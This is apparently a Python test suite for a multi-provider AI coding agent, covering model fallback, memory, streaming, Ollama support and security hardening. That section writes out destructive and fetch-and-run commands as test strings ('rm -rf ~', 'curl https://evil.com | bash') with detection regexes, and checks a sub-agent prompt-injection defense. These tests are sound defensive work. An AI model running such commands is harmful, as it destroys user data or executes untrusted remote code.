        fallbacks = client._get_fallback_models(
            "anthropic", "claude-sonnet-4-6", intended_tier="balanced"
        )
        # First fallbacks should be balanced tier
        if fallbacks:
            first_provider, first_model = fallbacks[0]
            # Verify this is a balanced model
            for p, m, t, c in client._available_models:
                if m == first_model:
                    self.assertEqual(t, "balanced")
                    break

    def test_healthy_providers_first(self):
        """Healthy providers should be prioritized over unhealthy ones in fallback."""
        client = _make_client(
            anthropic_api_key="sk-ant-TESTKEY123456",
            openai_api_key="sk-openai-TESTKEY123456",
            groq_api_key="gsk_TESTKEY123456789",
        )
        client._mark_provider_unhealthy("openai", "rate limited")
        fallbacks = client._get_fallback_models("anthropic", "claude-sonnet-4-6")
        # Within each group, healthy providers should come first
        providers = [p for p, _ in fallbacks]
        # Groq should appear before openai (groq is healthy, openai is not)
        if "groq" in providers and "openai" in providers:
            self.assertLess(providers.index("groq"), providers.index("openai"))


# ════════════════════════════════════════════════════════════════════════════════
# 15. _select_model — tier: prefix (BUG-7)
# ════════════════════════════════════════════════════════════════════════════════

class TestSelectModelTierPrefix(unittest.TestCase):

    def test_tier_strong(self):
        client = _make_client(anthropic_api_key="sk-ant-TESTKEY123456")
        provider, model = client._select_model("tier:strong")
        # Should select a strong-tier model
        for p, m, t, c in client.MODELS:
            if m == model:
                self.assertEqual(t, "strong")
                break

    def test_tier_fast(self):
        client = _make_client(anthropic_api_key="sk-ant-TESTKEY123456")
        provider, model = client._select_model("tier:fast")
        for p, m, t, c in client.MODELS:
            if m == model:
                self.assertEqual(t, "fast")
                break

    def test_tier_balanced(self):
        client = _make_client(anthropic_api_key="sk-ant-TESTKEY123456")
        provider, model = client._select_model("tier:balanced")
        for p, m, t, c in client.MODELS:
            if m == model:
                self.assertEqual(t, "balanced")
                break

    def test_unavailable_tier_falls_through(self):
        """If the requested tier has no available models, should fall through to strategy."""
        client = _make_client(groq_api_key="gsk_TESTKEY123456789")
        # Groq has no "strong" tier models
        provider, model = client._select_model("tier:strong")
        # Should still return a model (strategy-based fallback)
        self.assertIsNotNone(model)


PersistentMemory = co_vibe.PersistentMemory


class TestPersistentMemory(unittest.TestCase):
    """Tests for PersistentMemory class."""

    def setUp(self):
        self.td = tempfile.mkdtemp()
        self.pm = PersistentMemory(self.td)

    def tearDown(self):
        import shutil
        shutil.rmtree(self.td, ignore_errors=True)

    def test_new_session_increments(self):
        self.pm.new_session()
        self.assertEqual(self.pm._data["session_count"], 1)
        self.pm.new_session()
        self.assertEqual(self.pm._data["session_count"], 2)

    def test_record_decision(self):
        self.pm.record_decision("Use streaming", "UX fix")
        entries = self.pm._data["entries"]
        self.assertEqual(len(entries), 1)
        self.assertEqual(entries[0]["type"], "decision")
        self.assertIn("streaming", entries[0]["text"].lower())

    def test_record_file_change(self):
        self.pm.record_file_change("/foo/bar.py", "edit", "Added method")
        entries = self.pm._data["entries"]
        self.assertEqual(entries[0]["type"], "file_change")
        self.assertEqual(entries[0]["action"], "edit")

    def test_record_error(self):
        self.pm.record_error("Rate limited", "Switched provider")
        entries = self.pm._data["entries"]
        self.assertEqual(entries[0]["type"], "error")
        self.assertIn("Rate limited", entries[0]["error"])

    def test_set_active_tasks(self):
        self.pm.set_active_tasks(["Fix bug", "Add tests", "Deploy"])
        self.assertEqual(len(self.pm._data["active_tasks"]), 3)

    def test_get_context_for_agent(self):
        self.pm.new_session()
        self.pm.record_decision("Migrate to streaming")
        ctx = self.pm.get_context_for_agent()
        self.assertIn("Session #1", ctx)
        self.assertIn("Migrate to streaming", ctx)

    def test_context_includes_active_tasks(self):
        self.pm.set_active_tasks(["Fix streaming bug"])
        ctx = self.pm.get_context_for_agent()
        self.assertIn("Fix streaming bug", ctx)

    def test_compaction_triggers(self):
        for i in range(120):
            self.pm.record_decision(f"Decision {i}")
        self.assertLessEqual(len(self.pm._data["entries"]), 100)
        self.assertTrue(len(self.pm._data.get("summary", "")) > 0)

    def test_persistence_to_disk(self):
        self.pm.record_decision("Persist this")
        self.pm._save()
        pm2 = PersistentMemory(self.td)
        self.assertEqual(len(pm2._data["entries"]), 1)
        self.assertEqual(pm2._data["entries"][0]["text"], "Persist this")

    def test_max_chars_limit(self):
        for i in range(50):
            self.pm.record_decision(f"Decision {i} with some extra text padding")
        ctx = self.pm.get_context_for_agent(max_chars=500)
        self.assertLessEqual(len(ctx), 500)

    def test_truncation_of_long_values(self):
        self.pm.record_decision("x" * 1000)
        self.assertLessEqual(len(self.pm._data["entries"][0]["text"]), 500)


class TestChatStreamCollect(unittest.TestCase):
    """Tests for MultiProviderClient.chat_stream_collect."""

    def test_collects_text_from_stream(self):
        """Verify that chat_stream_collect collects streamed text into content."""
        client = _make_client(openai_api_key="sk-test")

        # Mock chat() to return a generator of OpenAI-format chunks
        def mock_chunks(*args, **kwargs):
            yield {"choices": [{"delta": {"content": "Hello"}, "finish_reason": None}]}
            yield {"choices": [{"delta": {"content": " world"}, "finish_reason": None}]}
            yield {"choices": [{"delta": {}, "finish_reason": "stop"}]}

        with patch.object(client, "chat", side_effect=mock_chunks):
            result = client.chat_stream_collect("gpt-4o", [{"role": "user", "content": "hi"}])
            self.assertEqual(result["content"], "Hello world")
            self.assertEqual(result["tool_calls"], [])

    def test_collects_tool_calls_from_stream(self):
        """Verify tool_calls are properly assembled from streamed deltas."""
        client = _make_client(openai_api_key="sk-test")

        def mock_chunks(*args, **kwargs):
            yield {"choices": [{"delta": {"tool_calls": [
                {"index": 0, "id": "call_abc", "type": "function",
                 "function": {"name": "Read", "arguments": '{"file'}}
            ]}, "finish_reason": None}]}
            yield {"choices": [{"delta": {"tool_calls": [
                {"index": 0, "function": {"arguments": '_path": "/foo"}'}}
            ]}, "finish_reason": None}]}
            yield {"choices": [{"delta": {}, "finish_reason": "tool_calls"}]}

        with patch.object(client, "chat", side_effect=mock_chunks):
            result = client.chat_stream_collect("gpt-4o", [{"role": "user", "content": "read"}])
            self.assertEqual(len(result["tool_calls"]), 1)
            self.assertEqual(result["tool_calls"][0]["name"], "Read")
            self.assertEqual(result["tool_calls"][0]["arguments"], {"file_path": "/foo"})

    def test_progress_callback_called(self):
        """Verify on_progress callback is invoked during streaming."""
        client = _make_client(openai_api_key="sk-test")
        progress_calls = []

        def mock_chunks(*args, **kwargs):
            yield {"choices": [{"delta": {"content": "A" * 100}, "finish_reason": None}]}
            yield {"choices": [{"delta": {"content": "B" * 100}, "finish_reason": None}]}

        def on_progress(tokens, content):
            progress_calls.append((tokens, len(content)))

        with patch.object(client, "chat", side_effect=mock_chunks):
            with patch("time.time", side_effect=[0, 0.5, 1.0, 1.5, 2.0]):
                result = client.chat_stream_collect(
                    "gpt-4o", [{"role": "user", "content": "test"}],
                    on_progress=on_progress,
                )
            # Should have at least the final callback
            self.assertTrue(len(progress_calls) >= 1)
            self.assertEqual(result["content"], "A" * 100 + "B" * 100)

    def test_fallback_to_sync_on_stream_error(self):
        """If streaming setup fails, should fall back to chat_sync."""
        client = _make_client(openai_api_key="sk-test")

        with patch.object(client, "chat", side_effect=RuntimeError("stream failed")):
            with patch.object(client, "chat_sync", return_value={"content": "fallback", "tool_calls": []}):
                result = client.chat_stream_collect("gpt-4o", [{"role": "user", "content": "hi"}])
                self.assertEqual(result["content"], "fallback")

    def test_strips_think_blocks(self):
        """Verify <think> blocks are stripped from collected content."""
        client = _make_client(openai_api_key="sk-test")

        def mock_chunks(*args, **kwargs):
            yield {"choices": [{"delta": {"content": "<think>internal</think>Final answer"}, "finish_reason": None}]}

        with patch.object(client, "chat", side_effect=mock_chunks):
            result = client.chat_stream_collect("gpt-4o", [{"role": "user", "content": "hi"}])
            self.assertEqual(result["content"], "Final answer")


# ════════════════════════════════════════════════════════════════════════════════
# Phase 5: Ollama Integration Tests
# ════════════════════════════════════════════════════════════════════════════════

class TestOllamaConfig(unittest.TestCase):
    """Tests for Ollama auto-detection and configuration in Config."""

    def test_ollama_defaults(self):
        """Config should have Ollama-related attributes with defaults."""
        cfg = Config()
        self.assertEqual(cfg.ollama_base_url, "http://localhost:11434")
        self.assertFalse(cfg.ollama_enabled)

    def test_detect_ollama_env_disable(self):
        """CO_VIBE_NO_OLLAMA=1 should prevent detection."""
        cfg = Config()
        with patch.dict(os.environ, {"CO_VIBE_NO_OLLAMA": "1"}):
            result = cfg._detect_ollama()
            self.assertFalse(result)
            self.assertFalse(cfg.ollama_enabled)
            self.assertEqual(cfg._ollama_models, [])

    def test_detect_ollama_success(self):
        """Successful Ollama detection should set enabled=True and discover models."""
        cfg = Config()
        # Mock the HTTP calls
        mock_health = MagicMock()
        mock_health.read.return_value = b"Ollama is running"
        mock_health.close = MagicMock()
        mock_models = MagicMock()
        mock_models.read.return_value = json.dumps({
            "data": [{"id": "qwen2.5-coder:7b"}, {"id": "llama3.3:70b"}]
        }).encode()
        mock_models.close = MagicMock()
        with patch("urllib.request.urlopen", side_effect=[mock_health, mock_models]):
            with patch.dict(os.environ, {"CO_VIBE_NO_OLLAMA": ""}, clear=False):
                result = cfg._detect_ollama()
                self.assertTrue(result)
                self.assertTrue(cfg.ollama_enabled)
                self.assertIn("qwen2.5-coder:7b", cfg._ollama_models)
                self.assertIn("llama3.3:70b", cfg._ollama_models)

    def test_detect_ollama_connection_refused(self):
        """Failed connection should gracefully disable Ollama."""
        cfg = Config()
        with patch("urllib.request.urlopen", side_effect=ConnectionError("refused")):
            with patch.dict(os.environ, {"CO_VIBE_NO_OLLAMA": ""}, clear=False):
                result = cfg._detect_ollama()
                self.assertFalse(result)
                self.assertFalse(cfg.ollama_enabled)

    def test_has_key_ollama(self):
        """_has_key should return True for 'ollama' when enabled."""
        cfg = Config()
        cfg.ollama_enabled = False
        self.assertFalse(cfg._has_key("ollama"))
        cfg.ollama_enabled = True
        self.assertTrue(cfg._has_key("ollama"))

    def test_ollama_models_in_tier_defaults(self):
        """Ollama models should appear in TIER_DEFAULTS."""
        for tier_name, models in Config.TIER_DEFAULTS.items():
            ollama_models = [m for m in models if Config.MODEL_PROVIDERS.get(m) == "ollama"]
            self.assertTrue(len(ollama_models) >= 1, f"No Ollama models in tier '{tier_name}'")

    def test_ollama_models_in_model_providers(self):
        """All Ollama models in TIER_DEFAULTS should be in MODEL_PROVIDERS."""
        for tier_name, models in Config.TIER_DEFAULTS.items():
            for m in models:
                if Config.MODEL_PROVIDERS.get(m) == "ollama":
                    self.assertEqual(Config.MODEL_PROVIDERS[m], "ollama")

    def test_ollama_base_url_from_env(self):
        """OLLAMA_BASE_URL env var should override default."""
        with patch.dict(os.environ, {"OLLAMA_BASE_URL": "http://gpu-server:11434"}):
            cfg = Config()
            cfg._load_env()
            self.assertEqual(cfg.ollama_base_url, "http://gpu-server:11434")


class TestOllamaClient(unittest.TestCase):
    """Tests for Ollama in MultiProviderClient."""

    def test_ollama_in_available_models(self):
        """When Ollama is enabled, its models should appear in available_models."""
        cfg = _make_client_config(ollama_enabled=True, _ollama_models=["qwen2.5-coder:7b"])
        env_patch = {"ANTHROPIC_API_KEY": "", "OPENAI_API_KEY": "", "GROQ_API_KEY": "",
                     "CO_VIBE_STRATEGY": ""}
        with patch.dict(os.environ, env_patch, clear=False):
            client = MultiProviderClient(cfg)
            model_ids = [m[1] for m in client._available_models]
            self.assertIn("qwen2.5-coder:7b", model_ids)

    def test_ollama_models_filtered_by_installed(self):
        """Only locally installed Ollama models should appear."""
        cfg = _make_client_config(ollama_enabled=True, _ollama_models=["qwen2.5-coder:7b"])
        env_patch = {"ANTHROPIC_API_KEY": "", "OPENAI_API_KEY": "", "GROQ_API_KEY": "",
                     "CO_VIBE_STRATEGY": ""}
        with patch.dict(os.environ, env_patch, clear=False):
            client = MultiProviderClient(cfg)
            model_ids = [m[1] for m in client._available_models]
            # qwen2.5-coder:32b is not installed, shouldn't appear
            self.assertNotIn("qwen2.5-coder:32b", model_ids)
            # qwen2.5-coder:7b IS installed
            self.assertIn("qwen2.5-coder:7b", model_ids)

    def test_ollama_dummy_api_key(self):
        """Ollama should use dummy 'ollama' api key."""
        cfg = _make_client_config(ollama_enabled=True, _ollama_models=[])
        env_patch = {"ANTHROPIC_API_KEY": "", "OPENAI_API_KEY": "", "GROQ_API_KEY": "",
                     "CO_VIBE_STRATEGY": ""}
        with patch.dict(os.environ, env_patch, clear=False):
            client = MultiProviderClient(cfg)
            self.assertEqual(client._api_keys.get("ollama"), "ollama")

    def test_ollama_endpoint_override(self):
        """Custom ollama_base_url should be reflected in PROVIDER_ENDPOINTS."""
        cfg = _make_client_config(
            ollama_enabled=True, _ollama_models=[],
            ollama_base_url="http://gpu:8080")
        env_patch = {"ANTHROPIC_API_KEY": "", "OPENAI_API_KEY": "", "GROQ_API_KEY": "",
                     "CO_VIBE_STRATEGY": ""}
        with patch.dict(os.environ, env_patch, clear=False):
            client = MultiProviderClient(cfg)
            self.assertEqual(client.PROVIDER_ENDPOINTS["ollama"], "http://gpu:8080/v1")

    def test_ollama_no_tool_choice(self):
        """Ollama should not include tool_choice in payload."""
        cfg = _make_client_config(ollama_enabled=True, _ollama_models=["qwen2.5-coder:7b"])
        env_patch = {"ANTHROPIC_API_KEY": "", "OPENAI_API_KEY": "", "GROQ_API_KEY": "",
                     "CO_VIBE_STRATEGY": ""}
        with patch.dict(os.environ, env_patch, clear=False):
            client = MultiProviderClient(cfg)
            # Capture the payload sent to _http_request
            with patch.object(client, "_http_request") as mock_http:
                mock_http.return_value = {
                    "choices": [{"message": {"content": "test", "tool_calls": None},
                                 "finish_reason": "stop"}],
                    "usage": {"prompt_tokens": 10, "completion_tokens": 5}
                }
                tools = [{"type": "function", "function": {"name": "test", "parameters": {}}}]
                client._chat_openai_compat(
                    "ollama", "qwen2.5-coder:7b",
                    [{"role": "user", "content": "hi"}], tools, False)
                call_args = mock_http.call_args
                body = json.loads(call_args[0][1])
                self.assertNotIn("tool_choice", body)
                self.assertIn("tools", body)

    def test_hybrid_cloud_plus_local(self):
        """Both cloud and Ollama models should coexist."""
        cfg = _make_client_config(
            anthropic_api_key="sk-test",
            ollama_enabled=True,
            _ollama_models=["qwen2.5-coder:7b"])
        env_patch = {"ANTHROPIC_API_KEY": "", "OPENAI_API_KEY": "", "GROQ_API_KEY": "",
                     "CO_VIBE_STRATEGY": ""}
        with patch.dict(os.environ, env_patch, clear=False):
            client = MultiProviderClient(cfg)
            providers = set(m[0] for m in client._available_models)
            self.assertIn("anthropic", providers)
            self.assertIn("ollama", providers)


# ════════════════════════════════════════════════════════════════════════════════
# Phase 5: Security Hardening Tests
# ════════════════════════════════════════════════════════════════════════════════

_is_protected_path = co_vibe._is_protected_path
PersistentMemory = co_vibe.PersistentMemory
SmartTaskDecomposer = co_vibe.SmartTaskDecomposer

class TestSecurityHardening(unittest.TestCase):
    """Tests for expanded security protections."""

    def test_groq_api_key_redaction(self):
        """Groq API keys (gsk_) should be redacted in error messages."""
        import re
        text = "Error: gsk_abc123def456 is invalid"
        result = re.sub(r'(sk-|key-|sess-|gsk_)[A-Za-z0-9_-]{4,}', r'\1****', text)
        self.assertNotIn("abc123def456", result)
        self.assertIn("gsk_****", result)

    def test_protected_path_env_files(self):
        """.env and .env.local should be protected."""
        self.assertTrue(_is_protected_path("/project/.env"))
        self.assertTrue(_is_protected_path("/project/.env.local"))
        self.assertTrue(_is_protected_path("/project/.env.production"))
        self.assertTrue(_is_protected_path("/project/.env.staging"))

    def test_protected_path_key_files(self):
        """Key and certificate files should be protected."""
        self.assertTrue(_is_protected_path("/project/server.key"))
        self.assertTrue(_is_protected_path("/project/cert.pem"))
        self.assertTrue(_is_protected_path("/project/keystore.p12"))

    def test_protected_path_credentials(self):
        """Files with api_key or credentials in name should be protected."""
        self.assertTrue(_is_protected_path("/project/api_keys.json"))
        self.assertTrue(_is_protected_path("/project/credentials.json"))
        self.assertTrue(_is_protected_path("/project/api-key.txt"))

    def test_protected_path_normal_files_allowed(self):
        """Normal files should NOT be protected."""
        self.assertFalse(_is_protected_path("/project/main.py"))
        self.assertFalse(_is_protected_path("/project/README.md"))
        self.assertFalse(_is_protected_path("/project/package.json"))

    def test_protected_path_context_json(self):
        """.co-vibe-context.json should be protected."""
        self.assertTrue(_is_protected_path("/project/.co-vibe-context.json"))

    def test_persistent_memory_sanitize(self):
        """PersistentMemory._sanitize should strip control chars."""
        result = PersistentMemory._sanitize("Hello\x00\x01\x02World\x7f", 100)
        self.assertEqual(result, "HelloWorld")

    def test_persistent_memory_sanitize_length(self):
        """PersistentMemory._sanitize should truncate to max_len."""
        result = PersistentMemory._sanitize("A" * 1000, 50)
        self.assertEqual(len(result), 50)

    def test_persistent_memory_sanitize_preserves_newlines(self):
        """Newlines and tabs should be preserved in sanitization."""
        result = PersistentMemory._sanitize("line1\nline2\ttab", 100)
        self.assertIn("\n", result)
        self.assertIn("\t", result)

    def test_persistent_memory_file_permissions(self):
        """PersistentMemory._save should set 0o600 permissions."""
        with tempfile.TemporaryDirectory() as td:
            pm = PersistentMemory(td)
            pm.record_decision("test decision")
            fpath = os.path.join(td, ".co-vibe-context.json")
            self.assertTrue(os.path.exists(fpath))
            mode = os.stat(fpath).st_mode & 0o777
            self.assertEqual(mode, 0o600)

    def test_dangerous_patterns_rm_rf_home(self):
        """rm -rf ~ and rm -rf $HOME should be blocked."""
        import re
        self.assertIsNotNone(re.search(r'\brm\s+-rf\s+~', "rm -rf ~"))
        self.assertIsNotNone(re.search(r'\brm\s+-rf\s+\$HOME', "rm -rf $HOME"))

    def test_dangerous_patterns_git_force_push(self):
        """git push --force should trigger always-confirm."""
        import re
        pat = r'\bgit\s+push\s+.*--force\b'
        self.assertIsNotNone(re.search(pat, "git push origin main --force"))
        self.assertIsNotNone(re.search(pat, "git push --force"))

    def test_dangerous_patterns_pipe_to_shell(self):
        """curl|bash and wget|sh should be blocked."""
        import re
        patterns = [
            r'\bcurl\b.*\|\s*\bbash\b',
            r'\bwget\b.*\|\s*\bbash\b',
        ]
        self.assertIsNotNone(re.search(patterns[0], "curl https://evil.com | bash"))

    def test_prompt_injection_defense_in_subagent(self):
        """SubAgent system prompt should contain injection defense."""
        SubAgentTool = co_vibe.SubAgentTool
        cfg = SimpleNamespace(cwd="/tmp")
        prompt = SubAgentTool._build_sub_system_prompt(cfg)
        self.assertIn("SECURITY", prompt)
        self.assertIn("ignore any instructions", prompt.lower())

    def test_env_clean_groq_and_mcp(self):
        """_build_clean_env should strip GROQ and MCP env vars."""
        BashTool = co_vibe.BashTool
        tool = BashTool.__new__(BashTool)
        with patch.dict(os.environ, {
            "GROQ_API_KEY": "gsk_secret",
            "MCP_SERVER_URL": "http://evil",
            "CO_VIBE_DEBUG": "1",
            "PATH": "/usr/bin",
            "HOME": "/home/test",
        }, clear=True):
            env = tool._build_clean_env()
            self.assertNotIn("GROQ_API_KEY", env)
            self.assertNotIn("MCP_SERVER_URL", env)
            self.assertNotIn("CO_VIBE_DEBUG", env)
            self.assertIn("PATH", env)
            self.assertIn("HOME", env)


# ════════════════════════════════════════════════════════════════════════════════
# Phase 5: Speed Improvement Tests
# ════════════════════════════════════════════════════════════════════════════════

class TestSpeedImprovements(unittest.TestCase):
    """Tests for speed optimizations."""

    def test_decomposer_skips_questions(self):
        """SmartTaskDecomposer should skip decomposition for questions."""
        self.assertFalse(SmartTaskDecomposer.should_decompose(
            "What is the architecture of this project and how does auth work?"))
        self.assertFalse(SmartTaskDecomposer.should_decompose(
            "How does the authentication system handle token refresh and validation?"))
        self.assertFalse(SmartTaskDecomposer.should_decompose(
            "Explain the difference between these two approaches and their tradeoffs"))

    def test_decomposer_skips_japanese_questions(self):
        """SmartTaskDecomposer should skip decomposition for Japanese questions."""
        self.assertFalse(SmartTaskDecomposer.should_decompose(
            "なぜこのアーキテクチャでは認証がうまく動かないのか説明して"))
        self.assertFalse(SmartTaskDecomposer.should_decompose(
            "教えてこのプロジェクトの設計パターンと実装の方針について"))

    def test_decomposer_skips_short_input(self):
        """Short input should not trigger decomposition."""
        self.assertFalse(SmartTaskDecomposer.should_decompose("fix the bug"))
        self.assertFalse(SmartTaskDecomposer.should_decompose("hello"))

    def test_decomposer_triggers_for_multi_action(self):
        """Multi-action requests should trigger decomposition."""
        self.assertTrue(SmartTaskDecomposer.should_decompose(
            "Implement a new authentication system and write tests for the login flow"))
        self.assertTrue(SmartTaskDecomposer.should_decompose(
            "Fix the database connection bug and refactor the query builder module"))

    def test_decomposer_single_task_patterns(self):
        """Single-word inputs should be skipped."""
        self.assertFalse(SmartTaskDecomposer.should_decompose("x"))

    def test_stagger_delay_reduced(self):
        """Stagger delay should be 0.3s, not 1.0s."""
        # Read the source to verify the stagger constant
        import inspect
        source = inspect.getsource(co_vibe.MultiAgentCoordinator)
        self.assertIn("AGENT_STAGGER_SECONDS", source)
        self.assertNotIn("idx * 1.0", source)

    def test_decomposer_uses_fast_model(self):
        """SmartTaskDecomposer should prefer model_fast for speed."""
        import inspect
        source = inspect.getsource(SmartTaskDecomposer.decompose)
        self.assertIn("model_fast", source)


class TestStripThinkBlocks(unittest.TestCase):
    """Tests for _strip_think_blocks helper."""

    _strip = staticmethod(co_vibe._strip_think_blocks)

    def test_removes_single_think_block(self):
        self.assertEqual(self._strip("<think>reasoning</think>Hello"), "Hello")

    def test_removes_multiple_think_blocks(self):
        text = "<think>a</think>Hi<think>b</think> there"
        self.assertEqual(self._strip(text), "Hi there")

    def test_multiline_think_block(self):
        text = "<think>\nline1\nline2\n</think>Result"
        self.assertEqual(self._strip(text), "Result")

    def test_no_think_blocks(self):
        self.assertEqual(self._strip("Just plain text"), "Just plain text")

    def test_empty_think_block(self):
        self.assertEqual(self._strip("<think></think>Result"), "Result")

    def test_nested_angle_brackets_inside(self):
        text = "<think>some <inner> tag</think>OK"
        self.assertEqual(self._strip(text), "OK")


class TestParseToolArguments(unittest.TestCase):
    """Tests for MultiProviderClient._parse_tool_arguments."""

    def setUp(self):
        cfg = Config()
        cfg.anthropic_api_key = "test-key"
        self.client = MultiProviderClient(cfg)

    def test_valid_json_string(self):
        result = self.client._parse_tool_arguments('{"key": "value"}')
        self.assertEqual(result, {"key": "value"})

    def test_dict_passthrough(self):
        d = {"a": 1}
        result = self.client._parse_tool_arguments(d)
        self.assertEqual(result, {"a": 1})

    def test_empty_string_returns_raw(self):
        result = self.client._parse_tool_arguments("")
        self.assertEqual(result, {"raw": ""})

    def test_invalid_json_returns_raw(self):
        result = self.client._parse_tool_arguments("{broken json")
        self.assertIn("raw", result)

    def test_truncates_oversized_args(self):
        huge = '{"x": "' + "A" * (co_vibe.MAX_TOOL_ARG_BYTES + 100) + '"}'
        result = self.client._parse_tool_arguments(huge)
        # Should not raise; either parsed truncated or returned raw
        self.assertIsInstance(result, dict)


class TestDeepResearchTool(unittest.TestCase):
    """Tests for DeepResearchTool (all network calls mocked)."""

    def _make_tool(self, debug=False):
        cfg = Config()
        cfg.anthropic_api_key = "test-key"
        cfg.debug = debug
        cfg.model = "test-model"
        cfg.sidecar_model = ""
        client = MagicMock()
        return co_vibe.DeepResearchTool(cfg, client), client

    def test_empty_query_returns_error(self):
        tool, _ = self._make_tool()
        result = tool.execute({"query": ""})
        self.assertIn("Error", result)

    def test_invalid_depth_falls_back_to_standard(self):
        tool, client = self._make_tool()
        # Mock chat_sync to return valid decomposition
        client.chat_sync.return_value = {"content": '["q1", "q2", "q3"]'}
        # Mock _search_all to return empty → early exit
        with patch.object(tool, '_search_all', return_value=[]):
            result = tool.execute({"query": "test", "depth": "invalid"})
        self.assertIn("no results", result)

    def test_depth_config_values(self):
        tool, _ = self._make_tool()
        self.assertIn("quick", tool._DEPTH_CONFIG)
        self.assertIn("standard", tool._DEPTH_CONFIG)
        self.assertIn("thorough", tool._DEPTH_CONFIG)
        # quick should have fewer sub-queries than thorough
        self.assertLess(tool._DEPTH_CONFIG["quick"][0], tool._DEPTH_CONFIG["thorough"][0])

    def test_decompose_query_fallback_on_error(self):
        tool, client = self._make_tool()
        client.chat_sync.side_effect = Exception("API error")
        result = tool._decompose_query("test query", 3, "")
        # Should return fallback queries
        self.assertIsInstance(result, list)
        self.assertGreater(len(result), 0)
        self.assertIn("test query", result)

    def test_decompose_query_with_focus_fallback(self):
        tool, client = self._make_tool()
        client.chat_sync.side_effect = Exception("API error")
        result = tool._decompose_query("test", 3, "recent papers")
        self.assertTrue(any("recent papers" in q for q in result))

    def test_decompose_query_parses_json_array(self):
        tool, client = self._make_tool()
        client.chat_sync.return_value = {"content": '["alpha search", "beta search"]'}
        result = tool._decompose_query("topic", 5, "")
        self.assertEqual(result, ["alpha search", "beta search"])

    def test_decompose_query_handles_markdown_code_block(self):
        tool, client = self._make_tool()
        client.chat_sync.return_value = {"content": '```json\n["q1", "q2"]\n```'}
        result = tool._decompose_query("topic", 5, "")
        self.assertEqual(result, ["q1", "q2"])

    def test_fetch_one_returns_empty_on_error(self):
        tool, _ = self._make_tool()
        with patch.object(co_vibe.WebFetchTool, 'execute', side_effect=Exception("network")):
            result = tool._fetch_one("https://example.com", 1000)
        self.assertEqual(result, "")

    def test_fetch_one_truncates_long_content(self):
        tool, _ = self._make_tool()
        long_text = "A" * 5000
        with patch.object(co_vibe.WebFetchTool, 'execute', return_value=long_text):
            result = tool._fetch_one("https://example.com", 100)
        self.assertEqual(len(result), 103)  # 100 + "..."
        self.assertTrue(result.endswith("..."))

    def test_fetch_one_rejects_error_response(self):
        tool, _ = self._make_tool()
        with patch.object(co_vibe.WebFetchTool, 'execute', return_value="Error: 404"):
            result = tool._fetch_one("https://example.com", 1000)
        self.assertEqual(result, "")

    def test_synthesize_fallback_on_error(self):
        tool, client = self._make_tool()
        client.chat_sync.side_effect = Exception("API down")
        sources = [{"title": "T1", "url": "http://a.com", "snippet": "snip", "content": "body"}]
        report, n = tool._synthesize("query", "", sources)
        self.assertIn("raw results", report)
        self.assertEqual(n, 1)

    def test_synthesize_respects_max_input(self):
        tool, client = self._make_tool()
        client.chat_sync.return_value = {"content": "Report text"}
        # Create sources that exceed MAX_SYNTHESIS_INPUT
        big_content = "X" * (tool._MAX_SYNTHESIS_INPUT + 1000)
        sources = [{"title": "Big", "url": "http://big.com", "snippet": "", "content": big_content}]
        report, n = tool._synthesize("query", "", sources)
        self.assertEqual(report, "Report text")
        self.assertEqual(n, 1)

    def test_full_execute_mocked_pipeline(self):
        """End-to-end test with all steps mocked."""
        tool, client = self._make_tool()
        # Step 1: decompose
        client.chat_sync.side_effect = [
            {"content": '["sub query 1"]'},                         # decompose
            {"content": "## Final Report\nSynthesized findings."},  # synthesize
        ]
        # Step 2: search
        with patch.object(tool, '_search_all', return_value=[
            {"title": "Result 1", "url": "https://example.com/1", "snippet": "snip1"},
        ]):
            # Step 3: fetch
            with patch.object(tool, '_fetch_one', return_value="Page content here"):
                result = tool.execute({"query": "test topic", "depth": "quick"})
        self.assertIn("Final Report", result)

    def test_resolve_model_falls_back(self):
        tool, _ = self._make_tool()
        # No model_fast set → should fall back to config.model
        result = tool._resolve_model("fast")
        self.assertEqual(result, "test-model")

    def test_progress_does_not_raise(self):
        """_progress should not raise even with special characters."""
        tool, _ = self._make_tool()
        tool._progress("Test 日本語 🔍 special chars")


if __name__ == "__main__":
    unittest.main()
